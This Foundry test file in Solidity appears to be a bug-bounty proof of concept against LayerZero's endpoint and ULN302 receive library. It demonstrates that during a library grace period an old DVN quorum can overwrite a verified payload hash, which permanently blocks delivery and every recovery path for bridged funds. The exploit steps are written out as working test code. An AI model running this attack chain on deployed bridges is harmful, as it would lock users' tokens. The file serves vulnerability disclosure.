// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { ILayerZeroReceiver } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroReceiver.sol";
import { EndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";

import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
import { DVN } from "../../contracts/uln/dvn/DVN.sol";
import { DVNFeeLib } from "../../contracts/uln/dvn/DVNFeeLib.sol";
import { IDVN } from "../../contracts/uln/interfaces/IDVN.sol";

import { PacketUtil } from "../util/Packet.sol";
import { AuditBase } from "./AuditBase.t.sol";

/// @title CRITICAL PoC: Permanent Fund Locking via Grace Period + Reverification
/// @author Bug Bounty Submission
///
/// @notice Demonstrates that an attacker controlling the DVN quorum of a deprecated
///         (but grace-period-valid) receive library can permanently lock user funds
///         by overwriting verified payload hashes.
///
/// @dev Attack Chain:
///   1. Admin upgrades default receive library with a grace period
///   2. Legitimate message verified by NEW library's DVN quorum
///   3. Before execution, attacker uses OLD library (still valid during grace period)
///      to re-verify same nonce with different payloadHash
///   4. _inbound() unconditionally OVERWRITES the stored payloadHash
///   5. lzReceive() for original message REVERTS (hash mismatch)
///   6. All recovery paths (nilify, burn, clear) require the CURRENT (malicious) hash
///   7. Original message permanently unrecoverable -> funds locked on source chain
///
/// @dev Root Cause: MessagingChannel._inbound() (line 45) performs unconditional
///      assignment instead of rejecting overwrites of existing non-empty hashes.
///
/// @dev Impact: Permanent locking of user funds. In OFT/cross-chain bridges,
///      tokens burned/locked on source chain can never be credited on destination.

/// @dev Mock OFT-like receiver that tracks token credits
contract MockOFTReceiver is ILayerZeroReceiver {
    mapping(address => uint256) public credits;
    uint256 public totalCredited;

    function lzReceive(
        Origin calldata, bytes32, bytes calldata _message, address, bytes calldata
    ) external payable {
        address recipient = address(bytes20(_message[:20]));
        uint256 amount = abi.decode(_message[20:52], (uint256));
        credits[recipient] += amount;
        totalCredited += amount;
    }

    function allowInitializePath(Origin calldata) external pure returns (bool) { return true; }
    function nextNonce(uint32, bytes32) external pure returns (uint64) { return 0; }
}

contract CriticalPoCTest is AuditBase {

    ReceiveUln302 internal newReceiveUln;
    DVN internal newDvn;
    MockOFTReceiver internal mockOFT;

    // Attack context stored as state to avoid stack-too-deep
    bytes internal legitimateMessage;
    bytes internal legitimateHeader;
    bytes32 internal legitimatePayloadHash;
    bytes32 internal legitimateGuid;
    bytes32 internal maliciousPayloadHash;
    bytes32 internal senderBytes32;

    address internal constant VICTIM = address(0xBEEF);
    uint256 internal constant BRIDGE_AMOUNT = 100 ether;

    function setUp() public override {
        super.setUp();
        mockOFT = new MockOFTReceiver();
        newReceiveUln = new ReceiveUln302(address(dstEndpoint));
        dstEndpoint.registerLibrary(address(newReceiveUln));
        newDvn = _deployNewDVN(address(newReceiveUln));
        _configureUln(newReceiveUln, address(newDvn));
        senderBytes32 = bytes32(uint256(uint160(address(this))));
    }

    function _deployNewDVN(address receiveLib) internal returns (DVN) {
        address[] memory libs = new address[](4);
        libs[0] = address(0);
        libs[1] = address(0);
        libs[2] = address(0);
        libs[3] = receiveLib;
        address[] memory signers = new address[](1);
        signers[0] = address(this);
        address[] memory admins = new address[](1);
        admins[0] = address(this);
        DVN dvn = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers, 1, admins);
        IDVN.DstConfigParam[] memory p = new IDVN.DstConfigParam[](1);
        p[0] = IDVN.DstConfigParam({ dstEid: DST_EID, gas: 5000, multiplierBps: 0, floorMarginUSD: 0 });
        dvn.setDstConfig(p);
        dvn.setWorkerFeeLib(address(new DVNFeeLib(DST_EID, 1e18)));
        return dvn;
    }

    function _configureUln(ReceiveUln302 receiveUln, address dvnAddr) internal {
        address[] memory dvns = new address[](1);
        dvns[0] = dvnAddr;
        UlnConfig memory cfg = UlnConfig(1, uint8(dvns.length), 0, 0, dvns, new address[](0));
        SetDefaultUlnConfigParam[] memory p = new SetDefaultUlnConfigParam[](1);
        p[0] = SetDefaultUlnConfigParam(SRC_EID, cfg);
        receiveUln.setDefaultUlnConfigs(p);
    }

    function _buildOFTMessage(address recipient, uint256 amount) internal pure returns (bytes memory) {
        return abi.encodePacked(bytes20(recipient), abi.encode(amount));
    }

    /// @dev Prepare attack context: build legitimate + malicious packets, store in state
    function _prepareAttackContext() internal {
        legitimateMessage = _buildOFTMessage(VICTIM, BRIDGE_AMOUNT);
        Packet memory pkt = PacketUtil.newPacket(1, SRC_EID, address(this), DST_EID, address(mockOFT), legitimateMessage);
        bytes memory encoded;
        bytes memory payload;
        (encoded, legitimateHeader, payload, legitimatePayloadHash) = _encodeAndSplit(pkt);
        legitimateGuid = pkt.guid;

        bytes memory malMsg = _buildOFTMessage(address(0xDEAD), 0);
        Packet memory malPkt = PacketUtil.newPacket(1, SRC_EID, address(this), DST_EID, address(mockOFT), malMsg);
        bytes memory malPayload;
        (, , malPayload, maliciousPayloadHash) = _encodeAndSplit(malPkt);
    }

    // ==================================================================================
    // CRITICAL PoC: Full Attack Flow with Permanent Fund Locking
    // ==================================================================================

    /// @notice Full attack demonstrating permanent fund loss
    function test_CRITICAL_PermanentFundLocking() public {
        // SETUP: Upgrade receive library with grace period
        dstEndpoint.setDefaultReceiveLibrary(SRC_EID, address(newReceiveUln), 100);
        assertTrue(dstEndpoint.isValidReceiveLibrary(address(mockOFT), SRC_EID, address(dstReceiveUln)));
        assertTrue(dstEndpoint.isValidReceiveLibrary(address(mockOFT), SRC_EID, address(newReceiveUln)));

        _prepareAttackContext();

        // STEP 1: New library's DVN verifies legitimate message (user bridging 100 ETH)
        vm.prank(address(newDvn));
        newReceiveUln.verify(legitimateHeader, legitimatePayloadHash, 1);
        newReceiveUln.commitVerification(legitimateHeader, legitimatePayloadHash);

        bytes32 stored = dstEndpoint.inboundPayloadHash(address(mockOFT), SRC_EID, senderBytes32, 1);
        assertEq(stored, legitimatePayloadHash, "Legitimate hash stored");
        assertEq(mockOFT.credits(VICTIM), 0, "Tokens awaiting execution");

        // STEP 2: ATTACK - Old library re-verifies with malicious payload
        _dvnVerify(dstDvn, dstReceiveUln, legitimateHeader, maliciousPayloadHash, 1);
        _commitVerification(dstReceiveUln, legitimateHeader, maliciousPayloadHash);

        // STEP 3: Verify overwrite
        stored = dstEndpoint.inboundPayloadHash(address(mockOFT), SRC_EID, senderBytes32, 1);
        assertEq(stored, maliciousPayloadHash, "CRITICAL: Hash overwritten by attacker");
        assertTrue(stored != legitimatePayloadHash, "Original hash gone");

        emit log("=== PAYLOAD OVERWRITE CONFIRMED ===");
        emit log_named_bytes32("  Original hash ", legitimatePayloadHash);
        emit log_named_bytes32("  Malicious hash", maliciousPayloadHash);

        // STEP 4: lzReceive with legitimate message REVERTS
        _assertLzReceiveReverts();
        assertEq(mockOFT.credits(VICTIM), 0, "Tokens NOT credited - locked on source");

        // STEP 5: ALL recovery paths fail for original message
        _assertAllRecoveryPathsFail();

        emit log("========================================");
        emit log("  PERMANENT FUND LOCKING CONFIRMED");
        emit log("========================================");
        emit log_named_uint("  Locked amount (wei)", BRIDGE_AMOUNT);
        emit log_named_address("  Victim", VICTIM);
        emit log("  lzReceive: REVERTS | clear: REVERTS");
        emit log("  nilify: REVERTS | burn: REVERTS");
        emit log("  Source chain tokens: PERMANENTLY LOCKED");
        emit log("========================================");
    }

    function _assertLzReceiveReverts() internal {
        Origin memory origin = Origin(SRC_EID, senderBytes32, 1);
        vm.expectRevert();
        dstEndpoint.lzReceive(origin, address(mockOFT), legitimateGuid, legitimateMessage, "");
        emit log("  lzReceive with original message: REVERTED");
    }

    function _assertAllRecoveryPathsFail() internal {
        Origin memory origin = Origin(SRC_EID, senderBytes32, 1);

        // clear() with original message
        vm.expectRevert();
        dstEndpoint.clear(address(mockOFT), origin, legitimateGuid, legitimateMessage);
        emit log("  clear() with original message: REVERTED");

        // nilify() with original hash
        vm.expectRevert();
        dstEndpoint.nilify(address(mockOFT), SRC_EID, senderBytes32, 1, legitimatePayloadHash);
        emit log("  nilify() with original hash: REVERTED");

        // burn() with original hash
        vm.expectRevert();
        dstEndpoint.burn(address(mockOFT), SRC_EID, senderBytes32, 1, legitimatePayloadHash);
        emit log("  burn() with original hash: REVERTED");
    }

    // ==================================================================================
    // SUPPLEMENTARY: Root cause and prerequisite verification
    // ==================================================================================

    /// @notice Proves _inbound() performs unconditional overwrite (root cause)
    function test_ROOTCAUSE_InboundOverwritesExistingHash() public {
        Packet memory pkt1 = PacketUtil.newPacket(1, SRC_EID, address(this), DST_EID, address(mockOFT), "payload_A");
        (, bytes memory header1, , bytes32 hash1) = _encodeAndSplit(pkt1);

        Packet memory pkt2 = PacketUtil.newPacket(1, SRC_EID, address(this), DST_EID, address(mockOFT), "payload_B");
        (, , , bytes32 hash2) = _encodeAndSplit(pkt2);

        _dvnVerify(dstDvn, dstReceiveUln, header1, hash1, 1);
        _commitVerification(dstReceiveUln, header1, hash1);
        assertEq(dstEndpoint.inboundPayloadHash(address(mockOFT), SRC_EID, senderBytes32, 1), hash1);

        // Second verification overwrites - THIS IS THE BUG
        _dvnVerify(dstDvn, dstReceiveUln, header1, hash2, 1);
        _commitVerification(dstReceiveUln, header1, hash2);
        assertEq(
            dstEndpoint.inboundPayloadHash(address(mockOFT), SRC_EID, senderBytes32, 1),
            hash2,
            "ROOT CAUSE: _inbound() overwrites existing hash"
        );
    }

    /// @notice Proves grace period is required (no grace period = safe)
    function test_PREREQUISITE_NoGracePeriodPreventsAttack() public {
        dstEndpoint.setDefaultReceiveLibrary(SRC_EID, address(newReceiveUln), 0);
        assertFalse(dstEndpoint.isValidReceiveLibrary(address(mockOFT), SRC_EID, address(dstReceiveUln)));

        _prepareAttackContext();

        vm.prank(address(newDvn));
        newReceiveUln.verify(legitimateHeader, legitimatePayloadHash, 1);
        newReceiveUln.commitVerification(legitimateHeader, legitimatePayloadHash);

        bytes32 malHash = keccak256("malicious");
        _dvnVerify(dstDvn, dstReceiveUln, legitimateHeader, malHash, 1);

        vm.expectRevert(); // LZ_InvalidReceiveLibrary
        _commitVerification(dstReceiveUln, legitimateHeader, malHash);

        emit log("CONFIRMED: Zero grace period prevents the attack");
    }
}
